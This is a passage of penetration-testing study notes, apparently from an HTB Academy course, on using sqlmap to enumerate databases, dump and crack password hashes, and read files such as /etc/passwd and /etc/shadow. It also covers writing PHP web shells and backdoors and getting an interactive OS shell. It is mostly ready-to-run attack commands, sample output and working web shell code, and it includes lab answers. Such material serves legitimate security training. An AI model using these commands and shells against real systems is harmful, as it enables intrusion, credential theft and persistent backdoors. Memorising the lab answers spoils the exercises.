- **Complete architecture overview** - all databases, tables, columns
- **Data type identification** - varchar, int, datetime, blob
- **Column count verification** - useful for manual UNION attacks
- **Target identification** - spot interesting tables/columns

##### Advanced Search Functionality

**Search Tables by Name:**
```bash
# Find all tables containing "user" in name
sqlmap -u "http://www.example.com/?id=1" --search -T user

# Expected output:
Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+

Database: master  
[1 table]
+-----------------+
| users           |
+-----------------+

Database: mysql
[1 table]
+-----------------+
| user            |
+-----------------+
```

**Search Columns by Name:**
```bash
# Find all columns containing "pass" in name
sqlmap -u "http://www.example.com/?id=1" --search -C pass

# Expected output:
Database: master
Table: users
[1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+

Database: owasp10
Table: accounts
[1 column]
+----------+------+
| Column   | Type |
+----------+------+
| password | text |
+----------+------+
```

**Search Pattern Examples:**
```bash
# Common search targets
sqlmap -u "URL" --search -T user                # User tables
sqlmap -u "URL" --search -T admin               # Admin tables
sqlmap -u "URL" --search -T account             # Account tables
sqlmap -u "URL" --search -T login               # Login tables

sqlmap -u "URL" --search -C pass                # Password columns
sqlmap -u "URL" --search -C email               # Email columns
sqlmap -u "URL" --search -C credit              # Credit card columns
sqlmap -u "URL" --search -C style               # Style columns (HTB Academy)
```

##### Automatic Password Hash Cracking

**Password Table Enumeration:**
```bash
# Extract password table with automatic hash detection
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users

# SQLMap automatically detects password hashes:
[INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file? [y/N] N
do you want to crack them via dictionary-based attack? [Y/n/q] Y
```

**Hash Cracking Process:**
```bash
# Automatic hash cracking capabilities:
- 31 different hash algorithm support
- 1.4 million entry dictionary (compiled from public leaks)
- Multi-processing based on CPU cores
- Real-time cracking feedback

# Example cracking output:
[INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'
[INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'
[INFO] cracked password 'testpass' for user 'root'
```

**Cracked Results Display:**
```
Database: master
Table: users
[32 entries]
+----+-------------------+-------------------------------------------------------------+
| id | name              | password                                                    |
+----+-------------------+-------------------------------------------------------------+
| 1  | Maynard Rice      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             |
| 2  | Julio Thomas      | 10945aa229a6d569f226976b22ea0e900a1fc219 (taqris)           |
| 6  | Kimberly Wright   | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      |
+----+-------------------+-------------------------------------------------------------+
```

##### Database User Password Cracking

**System User Password Enumeration:**
```bash
# Target database system users (not application users)
sqlmap -u "http://www.example.com/?id=1" --passwords --batch

# Process:
1. Extracts database user accounts (root, debian-sys-maint, etc.)
2. Retrieves password hashes from system tables
3. Attempts dictionary-based cracking
4. Displays cracked credentials
```

**Example Database User Results:**
```
database management system users password hashes:

[*] debian-sys-maint [1]:
    password hash: *6B2C58EABD91C1776DA223B088B601604F898847

[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```

##### Complete Automatic Enumeration

**All-in-One Enumeration:**
```bash
# Enumerate everything automatically (long-running!)
sqlmap -u "http://www.example.com/?id=1" --all --batch

# This will automatically:
1. Enumerate all databases
2. Enumerate all tables in each database  
3. Enumerate all columns in each table
4. Extract all data from all tables
5. Crack any found password hashes
6. Attempt file operations if possible
7. Save everything to output files
```

**Caution with --all:**
- **Very time-consuming** - can run for hours
- **Generates massive output** - requires manual analysis
- **May trigger detection** - extensive database queries
- **Use selectively** - better to target specific data

##### HTB Academy Examples

**Case #1 - Column Search:**
```bash
# Find column containing "style" in name
sqlmap -u "http://target/case1.php?id=1" --search -C style --batch

# Expected result: Column name containing "style"
```

**Case #1 - Password Extraction:**
```bash
# Extract and crack Kimberly's password
sqlmap -u "http://target/case1.php?id=1" --dump -T users --batch

# Look for Kimberly user in results:
| 6  | Kimberly Wright   | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      |
# Answer: Enizoom1609
```

##### Quick Reference: Advanced Enumeration
```bash
# Schema analysis
sqlmap -u "URL" --schema                         # Complete database structure

# Intelligent search
sqlmap -u "URL" --search -T user                 # Find user tables
sqlmap -u "URL" --search -C pass                 # Find password columns

# Password operations  
sqlmap -u "URL" --dump -T users --batch          # Extract + crack user passwords
sqlmap -u "URL" --passwords --batch              # Extract + crack DB user passwords

# Nuclear option
sqlmap -u "URL" --all --batch                    # Extract everything (use carefully!)
```

##### Database Enumeration
```bash
# Basic enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

# Database discovery
sqlmap -u "http://www.example.com/?id=1" --dbs         # List databases

# Table enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb                    # List tables
sqlmap -u "http://www.example.com/?id=1" -D dbname --tables                    # Tables in specific DB

# Column enumeration
sqlmap -u "http://www.example.com/?id=1" -D dbname -T tablename --columns      # List columns

# Data extraction
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname        # Dump specific columns
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"  # Conditional dump

# Advanced enumeration
sqlmap -u "http://www.example.com/?id=1" --schema      # Complete database schema
sqlmap -u "http://www.example.com/?id=1" --search -T user                      # Search tables by name
sqlmap -u "http://www.example.com/?id=1" --search -C pass                      # Search columns by name
sqlmap -u "http://www.example.com/?id=1" --all --batch                         # Enumerate everything automatically
```

##### Privilege & Security
```bash
# Privilege checks
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba                    # Check DBA privileges

# Password operations
sqlmap -u "http://www.example.com/?id=1" --passwords --batch                   # Enumerate/crack passwords
```

##### OS Exploitation

#### DBA Privilege Verification

**Why Check DBA Privileges?**
- **File operations** require special database privileges
- **DBA status** greatly increases success probability
- **Modern DBMS** restrict file operations for security

**Check DBA Status:**
```bash
# Verify DBA privileges
sqlmap -u "http://www.example.com/?id=1" --is-dba

# Expected outputs:
current user is DBA: True   # ✅ High privileges - file operations likely possible
current user is DBA: False  # ❌ Limited privileges - file operations may fail
```

#### File Read Operations

**Prerequisites for File Reading:**
- **MySQL**: `LOAD DATA` and `INSERT` privileges
- **DBA privileges** (preferred but not always required)
- **File system permissions** on target files

**Basic File Reading:**
```bash
# Read system files
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

# Expected process:
[INFO] fetching file: '/etc/passwd'
[INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
files saved to [1]:
[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)
```

**View Retrieved File:**
```bash
# Check downloaded file
cat ~/.sqlmap/output/www.example.com/files/_etc_passwd

# Expected content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**Common Target Files:**
```bash
# System information
sqlmap -u "URL" --file-read "/etc/passwd"              # User accounts
sqlmap -u "URL" --file-read "/etc/shadow"              # Password hashes (if permissions)
sqlmap -u "URL" --file-read "/etc/hosts"               # Host configurations
sqlmap -u "URL" --file-read "/proc/version"            # Kernel version

# Web application files
sqlmap -u "URL" --file-read "/var/www/html/config.php" # Database credentials
sqlmap -u "URL" --file-read "/var/www/html/flag.txt"   # HTB Academy flags
sqlmap -u "URL" --file-read "/var/log/apache2/access.log" # Log files
```

#### File Write Operations

**Prerequisites for File Writing:**
- **DBA privileges** (usually required)
- **`--secure-file-priv`** disabled or unrestricted
- **Write permissions** on target directory
- **Web server** access to written files

**Basic File Writing Process:**
```bash
# Step 1: Create local web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 2: Upload web shell to target
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# Expected confirmation:
[INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)

# Step 3: Test web shell access
curl http://www.example.com/shell.php?cmd=ls+-la
```

**Alternative Web Shells:**
```bash
# PHP command shell
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php

# PHP with output formatting
echo '<?php if(isset($_GET["cmd"])){ echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; } ?>' > advanced.php

# Simple file uploader
echo '<?php if(isset($_FILES["file"])){ move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]); } ?>' > upload.php
```

#### Automated OS Shell

**Direct OS Shell Access:**
```bash
# Automated OS shell deployment
sqlmap -u "http://www.example.com/?id=1" --os-shell

# SQLMap will:
1. Check DBA privileges
2. Determine web server language (PHP/ASP/JSP)
3. Find web root directory
4. Upload backdoor files
5. Provide interactive shell
```

**OS Shell Deployment Process:**
```
which web application language does the web server support?
[1] ASP
[2] ASPX  
[3] JSP
[4] PHP (default)
> 4

what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, ...') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1

[INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php
[INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php
[INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la
command standard output:
---
total 156
drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
```

#### Troubleshooting OS Shell Issues

**Common Problems & Solutions:**

**1. No Output from UNION Technique:**
```bash
# Problem: UNION technique fails to provide output
os-shell> ls -la
No output

# Solution: Use Error-based technique
sqlmap -u "URL" --os-shell --technique=E
```

**2. Permission Denied Errors:**
```bash
# Problem: Cannot write to /var/www/
[WARNING] potential permission problems detected ('Permission denied')
[WARNING] unable to upload the file stager on '/var/www/'

# Solution: Try alternative directories
[INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[INFO] the file stager has been successfully uploaded on '/var/www/html/'
```

**3. Web Root Discovery:**
```bash
# Automatic web root discovery
sqlmap -u "URL" --os-shell --batch  # Uses common locations

# Manual web root specification
sqlmap -u "URL" --os-shell
# Choose option [2] custom location(s)
# Enter: /var/www/html, /usr/local/apache2/htdocs, etc.
```

#### Advanced OS Exploitation Techniques

**Multiple Technique Testing:**
```bash
# Try different SQLi techniques for OS shell
sqlmap -u "URL" --os-shell --technique=U    # UNION-based
sqlmap -u "URL" --os-shell --technique=E    # Error-based  
sqlmap -u "URL" --os-shell --technique=B    # Boolean-based (slower)
sqlmap -u "URL" --os-shell --technique=T    # Time-based (very slow)
```

**Custom Shell Upload:**
```bash
# Upload custom backdoor
sqlmap -u "URL" --file-write "custom_shell.php" --file-dest "/var/www/html/backdoor.php"

# Multi-functional shell
cat > advanced_shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
if(isset($_GET['download'])) {
    $file = $_GET['download'];
    if(file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
    }
}
?>
EOF
```

#### HTB Academy Examples

**Flag Reading Challenge:**
```bash
# Read flag file from web directory
sqlmap -u "http://target/?id=1" --file-read "/var/www/html/flag.txt"

# Alternative locations to try:
sqlmap -u "URL" --file-read "/flag.txt"
sqlmap -u "URL" --file-read "/home/flag.txt"  
sqlmap -u "URL" --file-read "/root/flag.txt"
```

**Interactive OS Shell Challenge:**
```bash
# Get interactive shell and explore
sqlmap -u "http://target/?id=1" --os-shell --technique=E --batch

# Commands to try in shell:
os-shell> find / -name "*flag*" -type f 2>/dev/null
os-shell> cat /path/to/discovered/flag
os-shell> ls -la /var/www/html/
os-shell> ps aux
os-shell> whoami
```

#### Quick Reference: OS Exploitation
```bash
# Privilege verification
sqlmap -u "URL" --is-dba                              # Check DBA status

# File operations
sqlmap -u "URL" --file-read "/etc/passwd"             # Read system files
sqlmap -u "URL" --file-read "/var/www/html/flag.txt"  # Read flag files
sqlmap -u "URL" --file-write "shell.php" --file-dest "/var/www/html/shell.php"  # Upload web shell

# OS shell access
sqlmap -u "URL" --os-shell --batch                    # Automated OS shell
sqlmap -u "URL" --os-shell --technique=E --batch      # Force Error-based technique

# HTB Academy solutions
sqlmap -u "URL" --file-read "/var/www/html/flag.txt"  # Flag reading challenge
sqlmap -u "URL" --os-shell --technique=E              # Interactive shell challenge
```

##### Complete Enumeration Workflow
```bash
# Step 1: Basic discovery
sqlmap -u "http://target.com/page.php?id=1" --batch --banner --current-user --current-db

# Step 2: Database enumeration  
sqlmap -u "http://target.com/page.php?id=1" --batch --dbs

# Step 3: Table enumeration
sqlmap -u "http://target.com/page.php?id=1" --batch -D database_name --tables

# Step 4: Column enumeration
sqlmap -u "http://target.com/page.php?id=1" --batch -D database_name -T table_name --columns

# Step 5: Data extraction
sqlmap -u "http://target.com/page.php?id=1" --batch -D database_name -T table_name -C username,password --dump

# Step 6: File operations (if DBA)
sqlmap -u "http://target.com/page.php?id=1" --batch --file-read "/etc/passwd"
sqlmap -u "http://target.com/page.php?id=1" --batch --os-shell
```

##### Quick Reference Commands
```bash
# Fast automated scan
sqlmap -u "URL" --batch --level=5 --risk=3

# POST request with session
sqlmap -u "URL" --data="param=value" --cookie="session=abc" --batch

# File read + write + shell
sqlmap -u "URL" --file-read="/etc/passwd" --batch
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/" --batch  
sqlmap -u "URL" --os-shell --batch
```

#### Burp Suite Integration
```bash
# Workflow integration
1. Intercept request in Burp Suite
2. Save request to file (req.txt)
3. Use: sqlmap -r req.txt --batch
4. Analyze results in Burp Scanner
5. Manual verification with Repeater
``` 